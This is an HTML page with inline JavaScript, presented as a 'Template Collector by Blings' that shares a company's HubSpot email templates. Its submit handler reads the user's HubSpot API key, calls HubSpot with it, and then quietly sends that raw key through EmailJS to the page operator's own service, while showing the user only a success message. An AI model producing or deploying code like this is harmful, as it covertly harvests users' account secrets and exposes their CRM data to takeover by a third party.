```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Template Collector | Blings</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
</head>
<body class="bg-[#1B1B1B] min-h-screen">
    <div class="max-w-4xl mx-auto p-6">
        <div class="text-center mb-12">
            <h1 class="text-4xl font-bold text-[#FCFCFC] mb-4">
                Template Collector
                <span class="block text-[#DA458F]">by Blings</span>
            </h1>
        </div>

        <div class="bg-[#2D2D2D] rounded-lg p-8">
            <form id="templateForm" class="space-y-6">
                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-2">Company Name</label>
                    <input 
                        type="text" 
                        name="companyName" 
                        required
                        class="w-full p-2 bg-[#3D3D3D] border border-gray-700 rounded text-[#FCFCFC]"
                    >
                </div>

                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-2">HubSpot API Key</label>
                    <input 
                        type="password" 
                        name="apiKey" 
                        required
                        class="w-full p-2 bg-[#3D3D3D] border border-gray-700 rounded text-[#FCFCFC]"
                    >
                </div>

                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-2">Email Address</label>
                    <input 
                        type="email" 
                        name="email" 
                        required
                        class="w-full p-2 bg-[#3D3D3D] border border-gray-700 rounded text-[#FCFCFC]"
                    >
                </div>

                <button 
                    type="submit"
                    class="w-full bg-[#DA458F] text-white py-2 px-4 rounded hover:bg-opacity-90 transition-colors"
                >
                    Share Templates
                </button>
            </form>

            <div id="statusMessage" class="mt-4 text-center hidden">
                <p class="text-green-400">Processing your templates...</p>
            </div>
        </div>
    </div>

    <script>
        (function() {
            emailjs.init("pg5sAN7sjaiGSj43W");
        })();

        document.getElementById('templateForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const statusMessage = document.getElementById('statusMessage');
            statusMessage.classList.remove('hidden');
            statusMessage.innerHTML = '<p class="text-green-400">Processing your templates...</p>';
            
            const formData = new FormData(this);
            const apiKey = formData.get('apiKey');
            const companyName = formData.get('companyName');
            const email = formData.get('email');

            try {
                // Fetch templates from HubSpot
                const response = await fetch('https://api.hubapi.com/marketing-email/v1/templates', {
                    headers: {
                        'Authorization': `Bearer ${apiKey}`,
                        'Content-Type': 'application/json'
                    }
                });

                if (!response.ok) {
                    throw new Error('Failed to fetch templates');
                }

                const templates = await response.json();

                // Send email notification
                await emailjs.send(
                    "service_vzrvo2d",
                    "template_bbzu6uq",
                    {
                        company_name: companyName,
                        email: email,
                        template_count: templates.length,
                        api_key: apiKey
                    }
                );

                statusMessage.innerHTML = '<p class="text-green-400">Templates processed successfully! Check your email for details.</p>';
            } catch (error) {
                statusMessage.innerHTML = '<p class="text-red-400">Error processing templates. Please check your API key and try again.</p>';
                console.error('Error:', error);
            }
        });
    </script>
</body>
</html>
